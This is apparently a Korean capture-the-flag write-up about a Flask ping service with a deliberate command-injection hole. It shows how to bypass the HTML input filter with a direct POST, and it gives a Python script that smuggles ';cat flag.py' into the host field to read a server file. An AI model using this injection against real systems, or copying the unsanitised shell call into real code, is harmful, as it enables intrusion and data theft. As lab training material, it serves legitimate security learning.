## 코드

```python
#!/usr/bin/env python3
import subprocess

from flask import Flask, request, render_template, redirect

from flag import FLAG

APP = Flask(__name__)


@APP.route('/')
def index():
    return render_template('index.html')


@APP.route('/ping', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        host = request.form.get('host')
        cmd = f'ping -c 3 "{host}"'
        try:
            output = subprocess.check_output(['/bin/sh', '-c', cmd], timeout=5)
            return render_template('ping_result.html', data=output.decode('utf-8'))
        except subprocess.TimeoutExpired:
            return render_template('ping_result.html', data='Timeout !')
        except subprocess.CalledProcessError:
            return render_template('ping_result.html', data=f'an error occurred while executing the command. -> {cmd}')

    return render_template('ping.html')


if __name__ == '__main__':
    APP.run(host='0.0.0.0', port=8000)
```

## 풀이

```python
cmd = f'ping -c 3 "{host}"'
```

host를 검증하지 않고 명령어를 실행
따라서 그냥 127.0.0.1; 명령어
이런식으로 하면 됨

인줄 알았는데 템플릿에서 필터링 함

```html
pattern="[A-Za-z0-9.]{5,20}"
```

따라서 템플릿에 입력하지 말고 requests나 burp suite로 요청을 보내면 되겠다.

```python
import requests

if __name__ == "__main__":
    res = requests.post("http://host3.dreamhack.games:19643/ping", {"host": '8.8.8.8";cat flag.py"'})
    print(res.text)
```

이렇게 보내면 되는데, 여기서 중요한 지점은 ""로 명령어를 감싸는 것이다.
왜냐하면 cmd에서 ping -c 3 "8.8.8.8" 와 같이 실행하기 때문에,
명령어 단위에서 ;를 활용해 명령어를 여러개 실행하려면
ping -c 3 "8.8.8.8"; cat flag.py""
이런식으로 해야 한다.
결국엔 코드 상에서 8.8.8.8을 ""로 감싸고 있기 때문에 그래야 했다.
코드를 꼼꼼히 봐야한다..




